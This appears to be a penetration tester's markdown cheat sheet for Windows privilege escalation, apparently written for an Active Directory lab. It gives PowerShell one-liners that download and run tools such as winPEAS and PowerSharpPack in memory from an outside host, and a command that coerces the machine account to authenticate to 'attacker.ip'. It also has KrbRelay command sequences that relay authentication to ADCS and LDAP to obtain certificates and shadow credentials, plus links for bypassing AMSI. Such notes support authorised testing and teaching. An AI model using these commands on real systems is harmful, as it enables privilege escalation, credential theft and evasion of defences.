# PrivEsc

> Did you know you didn't need to use a potatoes exploit to going from iis apppool account to admin or system ?
> Simply use: 
> ```ps1
> powershell iwr http://attacker.ip -UseDefaultCredentials 
> ```
> To get an HTTP coerce of the machine account.
> <https://twitter.com/M4yFly/status/1745581076846690811?t=lntNso51gwxHZFPXGnSKpg&s=08>

## AMSI Bypass

- <https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
- <https://amsi.fail/>
- `amsi.dll` patching by rasta-mouse

## winPEAS in Memory

```ps1
$data=(New-Object System.Net.WebClient).DownloadData('http://10.10.10.200:8000/winPEASany_ofs.exe');
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
[winPEAS.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
```

### PowerSharpPack

```ps1
iex(new-object net.webclient).downloadstring('http://10.10.10.200:8000/PowerSharpPack/PowerSharpPack.ps1')
PowerSharpPack -winPEAS
```

### KrbRelay

- RBCD (by [@an0n_r0](https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9))

- Relay to ADCS w/ web enrollment to request a certificate of template `Machine` (by [@t0-n1](https://t0-n1.github.io/posts/krbrelay-with-adcs-web-enrollment/))
    ```ps1
    # braavos is the server hosting the ADCS
    .\CheckPort.exe
    $krbrelay = .\KrbRelay.exe -spn http/braavos.essos.local -port 10 -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -endpoint certsrv -adcs 'Machine'
    $certificate = $krbrelay[-1]
    echo $certificate
    # The base64 encoded output is usable on `Rubeus.exe`'s `/certificate:<base64>`
    Invoke-Rubeus "asktgt /user:BRAAVOS$ /certificate:$certificate /nowrap"
    ```

- Shadowcred (by [@icyguider](https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html))
    ```ps1
    # meereen is the domain controller
    .\CheckPort.exe
    .\KrbRelay.exe -spn ldap/meereen.essos.local -port 10 -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred
    # follow the output to use Rubeus
    ```

## Useful Links

- <https://github.com/S3cur3Th1sSh1t/PowerSharpPack>
- [EncodeAssembly.ps1](https://gist.github.com/Mayfly277/2e5f34a7e7f70798d1f19c0c35f9fa0e)
- <https://github.com/Dec0ne/KrbRelayUp>
- <https://github.com/cube0x0/KrbRelay>
- <https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9>

## Further Reading

- <https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/>
- <https://jlajara.gitlab.io/Potatoes_Windows_Privesc>
- <https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/dotnet-reflective-assembly>
- <https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/>
- <https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html>
- <https://t0-n1.github.io/posts/krbrelay-with-adcs-web-enrollment/>
- <https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html>
